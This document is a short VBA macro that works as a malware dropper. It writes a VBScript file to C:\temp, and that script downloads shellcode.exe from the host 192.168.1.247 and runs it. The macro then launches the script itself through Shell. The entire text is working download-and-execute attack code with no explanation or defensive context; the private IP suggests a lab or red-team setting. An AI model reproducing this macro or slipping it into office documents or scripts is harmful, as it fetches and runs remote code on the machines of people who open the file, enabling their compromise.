Sub WritePayload()
    Dim PayloadFile As Integer
    Dim FilePath As String
     FilePath = "C:\temp\payload.vbs"
     PayloadFile = FreeFile
     Open FilePath For Output As PayloadFile
     Print #PayloadFile, "HTTPDownload ""http://192.168.1.247/shellcode.exe"", ""C:\temp"""
     Print #PayloadFile, "Sub HTTPDownload( myURL, myPath ) Dim i, objFile, objFSO, objHTTP, strFile, strMsg"
     Print #PayloadFile, "Const ForReading = 1, ForWriting = 2, ForAppending = 8"
     Print #PayloadFile, "Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
     Print #PayloadFile, "If objFSO.FolderExists( myPath ) Then"
     Print #PayloadFile, "strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, ""/"" ) + 1 ))"
     Print #PayloadFile, "ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, ""\""  ) - 1 ) ) Then"
     Print #PayloadFile, "strFile = myPath"
     Print #PayloadFile, "End If"
     Print #PayloadFile, "MsgBox(strFile)"
     Print #PayloadFile, "Set objFile = objFSO.OpenTextFile ( strFile, ForWriting, True )"
     Print #PayloadFile, "Set objHTTP = CreateObject( ""WinHttp.WinHttpRequest.5.1"" )"
     Print #PayloadFile, "objHTTP.Open ""GET"", myURL, False"
     Print #PayloadFile, "objHTTP.Send"
     Print #PayloadFile, "For i = 1 To LenB( objHTTP.ResponseBody )"
     Print #PayloadFile, "    objFile.Write Chr( AscB( MidB( objHTTP.Responsebody, i, 1 ) ) )"
     Print #PayloadFile, "Next"
     Print #PayloadFile, "  objFile.Close()"
     Print #PayloadFile, "Set WshShell = WScript.CreateObject(""WScript.Shell"")"
     Print #PayloadFile, "WshShell.Run ""c:\temp\shellcode.exe"""
     Print #PayloadFile, "End Sub"
     Close PayloadFile
     Shell "wscript c:\temp\payload.vbs"
End Sub
